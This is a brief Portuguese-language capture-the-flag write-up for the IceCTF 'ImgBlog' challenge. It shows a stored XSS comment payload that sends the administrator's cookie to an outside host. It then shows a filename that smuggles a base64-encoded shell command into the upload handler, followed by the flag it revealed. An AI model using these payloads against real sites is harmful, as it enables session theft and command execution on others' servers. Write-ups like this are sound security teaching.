# ImgBlog

O desafio apresentava um blog simples, onde era possivel ler os comentarios, se cadastrar e postar comentarios nos posts, em cada comentário havia um botão para reportar caso o comentario fosse ofensivo.

Nos comentários era possivel o ataque XSS, conseguimos roubar o cookie do administrador, clicando em report depois de postar o seguinte comentario:

```
document.write('<img src="https://318.server/givme?cookie=' + document.cookie + '" />')
```

Feito isso, assumindo o login de admin, era apresentado uma opção a mais no menu de um form de upload, logo na primeira tentativa, era possivel notar que o sistema utilizava o binário file, com isso conseguimos executar comandos, utilizando o char **;**

```
'lol.jpg;echo Y2F0IC9mbGFnLnR4dAo=|base64 -d'
```

E então, na mensagem de erro, a flag era exibida

```
File is not an image: /uploads/loljpg: cannot open `/uploads/loljpg' (No such file or directory) IceCTF{why_would_you_use_shell_commands_in_your_web_app_plz_stop}
```
